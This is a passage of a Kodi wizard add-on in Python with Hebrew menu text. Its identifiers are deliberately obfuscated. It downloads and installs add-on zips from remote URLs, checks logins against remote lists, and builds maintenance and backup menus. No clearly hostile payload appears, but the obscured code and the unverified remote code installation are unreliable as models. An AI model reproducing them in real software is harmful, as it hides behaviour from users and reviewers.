							wiz .refresh ()#line:2441
							return True #line:2442
					if os .path .exists (os .path .join (ADDONS ,O0OO0O00OO0OO000O )):return True #line:2443
					O0OO0O0O00OO0O000 =wiz .parseDOM (wiz .openURL (O0OO00O00O00OOOOO ),'addon',ret ='version',attrs ={'id':O0OO0O00OO0OO000O })#line:2444
					if len (O0OO0O0O00OO0O000 )>0 :#line:2445
						O0OO00000OOOO0O00 ="%s%s-%s.zip"%(O0OO00000OOOO0O00 ,O0OO0O00OO0OO000O ,O0OO0O0O00OO0O000 [0 ])#line:2446
						wiz .log (str (O0OO00000OOOO0O00 ))#line:2447
						if KODIV >=17 :wiz .addonDatabase (O0OO0O00OO0OO000O ,1 )#line:2448
						installAddon (O0OO0O00OO0OO000O ,O0OO00000OOOO0O00 )#line:2449
						wiz .refresh ()#line:2450
					else :#line:2451
						wiz .log ("no match");return False #line:2452
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2453
		else :wiz .log ("[Addon Installer] Text File: %s"%O00000OO0OO00O00O )#line:2454
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2455
def installFromKodi (O0O0O0O00O0O0OOOO ,over =True ):#line:2457
	if over ==True :#line:2458
		xbmc .sleep (2000 )#line:2459
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0O0O00O0O0OOOO )#line:2461
	if not wiz .whileWindow ('yesnodialog'):#line:2462
		return False #line:2463
	xbmc .sleep (1000 )#line:2464
	if wiz .whileWindow ('okdialog'):#line:2465
		return False #line:2466
	wiz .whileWindow ('progressdialog')#line:2467
	if os .path .exists (os .path .join (ADDONS ,O0O0O0O00O0O0OOOO )):return True #line:2468
	else :return False #line:2469
def installAddon (O0OO0OO00OO000O0O ,O00OO0OOO00O000O0 ):#line:2471
	if not wiz .workingURL (O00OO0OOO00O000O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OO0OO00OO000O0O ,COLOR2 ));return #line:2472
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2473
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OO00OO000O0O ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2474
	O0OOOO0O000OO0O0O =O00OO0OOO00O000O0 .split ('/')#line:2475
	O000O00OOO0OO00O0 =os .path .join (PACKAGES ,O0OOOO0O000OO0O0O [-1 ])#line:2476
	try :os .remove (O000O00OOO0OO00O0 )#line:2477
	except :pass #line:2478
	downloader .download (O00OO0OOO00O000O0 ,O000O00OOO0OO00O0 ,DP )#line:2479
	O000O0O0O00O0OO0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO0OO00OO000O0O )#line:2480
	DP .update (0 ,O000O0O0O00O0OO0O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2481
	O000OOO000O000OO0 ,OOO00O0O000OOO00O ,OOO0OOOO000O0OO0O =extract .all (O000O00OOO0OO00O0 ,ADDONS ,DP ,title =O000O0O0O00O0OO0O )#line:2482
	DP .update (0 ,O000O0O0O00O0OO0O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2483
	installed (O0OO0OO00OO000O0O )#line:2484
	installDep (O0OO0OO00OO000O0O ,DP )#line:2485
	DP .close ()#line:2486
	wiz .ebi ('UpdateAddonRepos()')#line:2487
	wiz .ebi ('UpdateLocalAddons()')#line:2488
	wiz .refresh ()#line:2489
def installDep (O00000O0OO0O0O0O0 ,DP =None ):#line:2491
	O00OOO000O0O0OO0O =os .path .join (ADDONS ,O00000O0OO0O0O0O0 ,'addon.xml')#line:2492
	if os .path .exists (O00OOO000O0O0OO0O ):#line:2493
		O0O00OO0000O0OOOO =open (O00OOO000O0O0OO0O ,mode ='r');O0OO0OOO00O0O000O =O0O00OO0000O0OOOO .read ();O0O00OO0000O0OOOO .close ();#line:2494
		OOOO0O000OO000000 =wiz .parseDOM (O0OO0OOO00O0O000O ,'import',ret ='addon')#line:2495
		for OO00OOOO0O00OOOOO in OOOO0O000OO000000 :#line:2496
			if not 'xbmc.python'in OO00OOOO0O00OOOOO :#line:2497
				if not DP ==None :#line:2498
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOO0O00OOOOO ))#line:2499
				wiz .createTemp (OO00OOOO0O00OOOOO )#line:2500
def installed (O0OOOOO0O0OOOOOOO ):#line:2527
	O00OO0OO00OO00OO0 =os .path .join (ADDONS ,O0OOOOO0O0OOOOOOO ,'addon.xml')#line:2528
	if os .path .exists (O00OO0OO00OO00OO0 ):#line:2529
		try :#line:2530
			OOOO00O00OO00OO00 =open (O00OO0OO00OO00OO0 ,mode ='r');OOOOOO0O0OO0O000O =OOOO00O00OO00OO00 .read ();OOOO00O00OO00OO00 .close ()#line:2531
			OO000O00OOO0O00O0 =wiz .parseDOM (OOOOOO0O0OO0O000O ,'addon',ret ='name',attrs ={'id':O0OOOOO0O0OOOOOOO })#line:2532
			OO00OO0OOO0O0O000 =os .path .join (ADDONS ,O0OOOOO0O0OOOOOOO ,'icon.png')#line:2533
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO000O00OOO0O00O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO00OO0OOO0O0O000 )#line:2534
		except :pass #line:2535
def youtubeMenu (url =None ):#line:2537
	if not YOUTUBEFILE =='http://':#line:2538
		if url ==None :#line:2539
			O0OO0O0OOO0O0O0O0 =wiz .workingURL (YOUTUBEFILE )#line:2540
			O0OOO00000OOOOO00 =uservar .YOUTUBEFILE #line:2541
		else :#line:2542
			O0OO0O0OOO0O0O0O0 =wiz .workingURL (url )#line:2543
			O0OOO00000OOOOO00 =url #line:2544
		if O0OO0O0OOO0O0O0O0 ==True :#line:2545
			O0000000O0000OO00 =wiz .openURL (O0OOO00000OOOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2546
			OOO0OOOOO0O0O00O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000000O0000OO00 )#line:2547
			if len (OOO0OOOOO0O0O00O0 )>0 :#line:2548
				for OOO0O0000OO000O00 ,O0O0OO0O0OOOOO0O0 ,url ,O000O0OOO00000O00 ,O000O0OOOO00O0OO0 ,OO0O0O000O00O000O in OOO0OOOOO0O0O00O0 :#line:2549
					if O0O0OO0O0OOOOO0O0 .lower ()=="yes":#line:2550
						addDir ("[B]%s[/B]"%OOO0O0000OO000O00 ,'youtube',url ,description =OO0O0O000O00O000O ,icon =O000O0OOO00000O00 ,fanart =O000O0OOOO00O0OO0 ,themeit =THEME3 )#line:2551
					else :#line:2552
						addFile (OOO0O0000OO000O00 ,'viewVideo',url =url ,description =OO0O0O000O00O000O ,icon =O000O0OOO00000O00 ,fanart =O000O0OOOO00O0OO0 ,themeit =THEME2 )#line:2553
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2554
		else :#line:2555
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2556
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2557
			addFile ('%s'%O0OO0O0OOO0O0O0O0 ,'',themeit =THEME3 )#line:2558
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2559
	setView ('files','viewType')#line:2560
def STARTP ():#line:2561
	O0O0OOO00O0O0OO00 =(ADDON .getSetting ("pass"))#line:2562
	if BUILDNAME =="":#line:2563
	 if not NOTIFY =='true':#line:2564
          OO0O0OOOOOO000O00 =wiz .workingURL (NOTIFICATION )#line:2565
	 if not NOTIFY2 =='true':#line:2566
          OO0O0OOOOOO000O00 =wiz .workingURL (NOTIFICATION2 )#line:2567
	 if not NOTIFY3 =='true':#line:2568
          OO0O0OOOOOO000O00 =wiz .workingURL (NOTIFICATION3 )#line:2569
	OO0OOOO0OO0O000O0 =O0O0OOO00O0O0OO00 #line:2570
	OO0O0OOOOOO000O00 =urllib2 .Request (SPEED )#line:2571
	OO0O0OO0O0O0O0O00 =urllib2 .urlopen (OO0O0OOOOOO000O00 )#line:2572
	OO00O00OOOOOO0OOO =OO0O0OO0O0O0O0O00 .readlines ()#line:2574
	OO000OOO00OO0O0OO =0 #line:2578
	for O0O000O0O0O0O0O0O in OO00O00OOOOOO0OOO :#line:2579
		if O0O000O0O0O0O0O0O .split (' ==')[0 ]==O0O0OOO00O0O0OO00 or O0O000O0O0O0O0O0O .split ()[0 ]==O0O0OOO00O0O0OO00 :#line:2580
			OO000OOO00OO0O0OO =1 #line:2581
			break #line:2582
	if OO000OOO00OO0O0OO ==0 :#line:2583
					OO0O0O000OO00000O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2584
					if OO0O0O000OO00000O :#line:2586
						ADDON .openSettings ()#line:2588
						STARTP ()#line:2589
						sys .exit ()#line:2590
					else :#line:2591
						sys .exit ()#line:2592
	return 'ok'#line:2596
def STARTP2 ():#line:2597
	O0O00OOO0OO0O000O =(ADDON .getSetting ("user"))#line:2598
	O0OOOO0OOO0OO0O0O =(UNAME )#line:2600
	O0OO00O000OOO0O0O =urllib2 .urlopen (O0OOOO0OOO0OO0O0O )#line:2601
	O00O00000O0OO00O0 =O0OO00O000OOO0O0O .readlines ()#line:2602
	OO0O0OO0OO00OO000 =0 #line:2603
	for OOO000O0O000O000O in O00O00000O0OO00O0 :#line:2606
		if OOO000O0O000O000O .split (' ==')[0 ]==O0O00OOO0OO0O000O or OOO000O0O000O000O .split ()[0 ]==O0O00OOO0OO0O000O :#line:2607
			OO0O0OO0OO00OO000 =1 #line:2608
			break #line:2609
	if OO0O0OO0OO00OO000 ==0 :#line:2610
		OO000OOO00O0OO0O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2611
		if OO000OOO00O0OO0O0 :#line:2613
			ADDON .openSettings ()#line:2615
			STARTP2 ()#line:2617
			sys .exit ()#line:2618
		else :#line:2619
			sys .exit ()#line:2620
	return 'ok'#line:2624
def passandpin ():#line:2625
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2626
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2627
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2628
def passandUsername ():#line:2629
	ADDON .openSettings ()#line:2630
def folderback ():#line:2633
    OO0O00O00OOOO000O =ADDON .getSetting ("path")#line:2634
    if OO0O00O00OOOO000O :#line:2635
      OO0O00O00OOOO000O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2636
      ADDON .setSetting ("path",OO0O00O00OOOO000O )#line:2637
def backmyupbuild ():#line:2640
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2644
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2645
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2646
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2648
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2649
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2652
def maintMenu (view =None ):#line:2656
	O00000OO000OOOO00 ='[B][COLOR green]ON[/COLOR][/B]';O0OOO0000O0O0000O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2658
	OO0000O0OOOO0O000 ='true'if AUTOCLEANUP =='true'else 'false'#line:2659
	O00O0OOO000O0OOOO ='true'if AUTOCACHE =='true'else 'false'#line:2660
	O0O00O0OO00OOOO00 ='true'if AUTOPACKAGES =='true'else 'false'#line:2661
	O0O000O0000O0000O ='true'if AUTOTHUMBS =='true'else 'false'#line:2662
	O0O0O0O0O0O0OO0O0 ='true'if SHOWMAINT =='true'else 'false'#line:2663
	OO0O00000O0OOO0OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2664
	O0000OO00OOO0O000 ='true'if INCLUDEALL =='true'else 'false'#line:2665
	OO00OOO00OO0000O0 ='true'if THIRDPARTY =='true'else 'false'#line:2666
	if wiz .Grab_Log (True )==False :O00O0OOO0O00OOOOO =0 #line:2667
	else :O00O0OOO0O00OOOOO =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2668
	if wiz .Grab_Log (True ,True )==False :O0O0O00O00O000O00 =0 #line:2669
	else :O0O0O00O00O000O00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2670
	O0000OO0OOO0O0O0O =int (O00O0OOO0O00OOOOO )+int (O0O0O00O00O000O00 )#line:2671
	O0O00O0O0O0OOO000 =str (O0000OO0OOO0O0O0O )+' Error(s) Found'if O0000OO0OOO0O0O0O >0 else 'None Found'#line:2672
	OO0OOO0O00OOOO00O =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2673
	if O0000OO00OOO0O000 =='true':#line:2674
		O0O000OOOO0000OO0 ='true'#line:2675
		OOOOO0000OO0O000O ='true'#line:2676
		OOO0O0OO0O000000O ='true'#line:2677
		OO00OOO0O000OOO00 ='true'#line:2678
		O0000OO00O0OOOO00 ='true'#line:2679
		O0OOO000O0OO0OOOO ='true'#line:2680
		OO00O0OO0O0OO000O ='true'#line:2681
		OO000O0O0O0OOO000 ='true'#line:2682
	else :#line:2683
		O0O000OOOO0000OO0 ='true'if INCLUDEBOB =='true'else 'false'#line:2684
		OOOOO0000OO0O000O ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2685
		OOO0O0OO0O000000O ='true'if INCLUDESPECTO =='true'else 'false'#line:2686
		OO00OOO0O000OOO00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2687
		O0000OO00O0OOOO00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2688
		O0OOO000O0OO0OOOO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2689
		OO00O0OO0O0OO000O ='true'if INCLUDESALTS =='true'else 'false'#line:2690
		OO000O0O0O0OOO000 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2691
	OOO0OOOOOOOO00OO0 =wiz .getSize (PACKAGES )#line:2692
	OOOOOOOO0O0O0O0O0 =wiz .getSize (THUMBS )#line:2693
	OO0O0OOO0000OO0O0 =wiz .getCacheSize ()#line:2694
	O000OO0OO000000OO =OOO0OOOOOOOO00OO0 +OOOOOOOO0O0O0O0O0 +OO0O0OOO0000OO0O0 #line:2695
	OO00O00O0OO000OOO =['Daily','Always','3 Days','Weekly']#line:2696
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2697
	if view =="clean"or SHOWMAINT =='true':#line:2698
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OO0OO000000OO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2699
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OOO0000OO0O0 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2700
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OOOOOOOO00OO0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2701
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOOOOO0O0O0O0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2702
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2703
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2704
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2705
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2706
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2707
	if view =="addon"or SHOWMAINT =='false':#line:2708
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2709
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2710
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2711
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2712
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2713
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2714
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2715
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2716
	if view =="misc"or SHOWMAINT =='true':#line:2717
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2718
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2719
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2720
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2721
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2722
		addFile ('View Errors in Log: %s'%(O0O00O0O0O0OOO000 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2723
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2724
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2725
		addFile ('Clear Wizard Log File%s'%OO0OOO0O00OOOO00O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2726
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2727
	if view =="backup"or SHOWMAINT =='true':#line:2728
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2729
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2730
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2731
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2732
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2733
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2734
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2735
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2736
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2737
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2738
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2739
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2740
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2741
	if view =="tweaks"or SHOWMAINT =='true':#line:2742
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2743
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2744
		else :#line:2745
			if os .path .exists (ADVANCED ):#line:2746
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2747
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2748
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2749
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2750
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2751
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2752
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2753
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2754
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2755
	addFile ('Show All Maintenance: %s'%O0O0O0O0O0O0OO0O0 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2756
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2757
	addFile ('Third Party Wizards: %s'%OO00OOO00OO0000O0 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2758
	if OO00OOO00OO0000O0 =='true':#line:2759
		O0O0000O0O000OOOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2760
		OO0O0O00000OO0OOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2761
		OO000OOO0O0O00O00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2762
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0000O0O000OOOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2763
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0O00000OO0OOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2764
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000OOO0O0O00O00 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2765
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2766
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO0000O0OOOO0O000 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2767
	if OO0000O0OOOO0O000 =='true':#line:2768
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO00O00O0OO000OOO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2769
		addFile ('--- ניקוי קאש בהפעלה: %s'%O00O0OOO000O0OOOO .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2770
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O00O0OO00OOOO00 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2771
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O000O0000O0000O .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2772
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2773
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O00000O0OOO0OO .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2774
	if OO0O00000O0OOO0OO =='true':#line:2775
		addFile ('--- Include All Video Addons: %s'%O0000OO00OOO0O000 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2776
		addFile ('--- Include Bob: %s'%O0O000OOOO0000OO0 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2777
		addFile ('--- Include Phoenix: %s'%OOOOO0000OO0O000O .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2778
		addFile ('--- Include Specto: %s'%OOO0O0OO0O000000O .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2779
		addFile ('--- Include Exodus: %s'%O0000OO00O0OOOO00 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2780
		addFile ('--- Include Salts: %s'%OO00O0OO0O0OO000O .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2781
		addFile ('--- Include Salts HD Lite: %s'%OO000O0O0O0OOO000 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2782
		addFile ('--- Include One Channel: %s'%O0OOO000O0OO0OOOO .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2783
		addFile ('--- Include Genesis: %s'%OO00OOO0O000OOO00 .replace ('true',O00000OO000OOOO00 ).replace ('false',O0OOO0000O0O0000O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2784
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2785
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2786
	setView ('files','viewType')#line:2787
def advancedWindow (url =None ):#line:2789
	if not ADVANCEDFILE =='http://':#line:2790
		if url ==None :#line:2791
			OO0O0OO00OOOO0OO0 =wiz .workingURL (ADVANCEDFILE )#line:2792
			OOOO0000OOOOO0O00 =uservar .ADVANCEDFILE #line:2793
		else :#line:2794
			OO0O0OO00OOOO0OO0 =wiz .workingURL (url )#line:2795
			OOOO0000OOOOO0O00 =url #line:2796
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2797
		if os .path .exists (ADVANCED ):#line:2798
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2799
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2800
		if OO0O0OO00OOOO0OO0 ==True :#line:2801
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2802
			O0000OO00OO0OO000 =wiz .openURL (OOOO0000OOOOO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2803
			O0O00000O0O00OO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0000OO00OO0OO000 )#line:2804
			if len (O0O00000O0O00OO00 )>0 :#line:2805
				for OO00OOO0OOOOOOOOO ,OO0O0OOO0000OOO00 ,url ,O00000OO000000000 ,OO0000O0000O00OO0 ,OO00OOOOO00OO00OO in O0O00000O0O00OO00 :#line:2806
					if OO0O0OOO0000OOO00 .lower ()=="yes":#line:2807
						addDir ("[B]%s[/B]"%OO00OOO0OOOOOOOOO ,'advancedsetting',url ,description =OO00OOOOO00OO00OO ,icon =O00000OO000000000 ,fanart =OO0000O0000O00OO0 ,themeit =THEME3 )#line:2808
					else :#line:2809
